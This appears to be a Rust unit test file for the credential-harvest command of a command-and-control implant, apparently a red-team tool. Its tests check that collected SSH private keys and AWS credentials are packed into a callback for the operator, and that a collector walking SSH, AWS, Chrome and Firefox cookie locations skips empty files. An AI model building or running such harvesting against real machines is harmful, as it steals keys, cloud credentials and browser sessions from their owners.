use red_cell_common::demon::DemonCommand;

use super::super::DispatchResult;
use super::super::harvest::{
    HarvestEntry, HarvestRoots, collect_credentials_for_roots, harvest_dispatch_result,
};
use super::{harvest_expected_payload, make_test_persist_dir};

// ── CommandHarvest ───────────────────────────────────────────────────────

#[test]
fn command_harvest_returns_structured_callback_for_collected_entries() {
    let result = harvest_dispatch_result(vec![
        HarvestEntry {
            kind: "ssh_key".to_owned(),
            path: "C:\\Users\\operator\\.ssh\\id_ed25519".to_owned(),
            data: b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n".to_vec(),
        },
        HarvestEntry {
            kind: "credentials".to_owned(),
            path: "C:\\Users\\operator\\.aws\\credentials".to_owned(),
            data: b"[default]\naws_access_key_id=AKIA...\n".to_vec(),
        },
    ]);

    let DispatchResult::Respond(response) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
    assert_eq!(
        response.payload,
        harvest_expected_payload(&[
            (
                "ssh_key",
                "C:\\Users\\operator\\.ssh\\id_ed25519",
                b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n",
            ),
            (
                "credentials",
                "C:\\Users\\operator\\.aws\\credentials",
                b"[default]\naws_access_key_id=AKIA...\n",
            ),
        ])
    );
}

#[test]
fn command_harvest_empty_result_encodes_zero_entries() {
    let result = harvest_dispatch_result(Vec::new());

    let DispatchResult::Respond(response) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
    assert_eq!(response.payload, [0u8, 0, 0, 0]);
}

#[test]
fn collect_credentials_for_roots_skips_empty_files() {
    let base = make_test_persist_dir("specter_harvest_empty");
    let user_profile = base.join("user");
    let app_data = base.join("appdata");
    let local_app_data = base.join("localappdata");

    std::fs::create_dir_all(user_profile.join(".ssh")).expect("create ssh dir");
    std::fs::create_dir_all(user_profile.join(".aws")).expect("create aws dir");
    std::fs::create_dir_all(local_app_data.join("Google/Chrome/User Data/Default/Network"))
        .expect("create chrome dir");
    std::fs::create_dir_all(app_data.join("Mozilla/Firefox/Profiles/profile.default"))
        .expect("create firefox dir");
    std::fs::write(user_profile.join(".ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA")
        .expect("write public key");
    std::fs::write(local_app_data.join("Google/Chrome/User Data/Default/Network/Cookies"), b"")
        .expect("write empty cookie db");
    std::fs::write(app_data.join("Mozilla/Firefox/Profiles/profile.default/cookies.sqlite"), b"")
        .expect("write empty firefox db");
    std::fs::write(user_profile.join(".aws/credentials"), b"").expect("write empty creds");

    let roots = HarvestRoots {
        user_profile: user_profile.clone(),
        app_data: Some(app_data.clone()),
        local_app_data: Some(local_app_data.clone()),
    };

    let entries = collect_credentials_for_roots(&roots);
    assert!(entries.is_empty(), "unexpected entries: {entries:?}");

    let _ = std::fs::remove_dir_all(base);
}
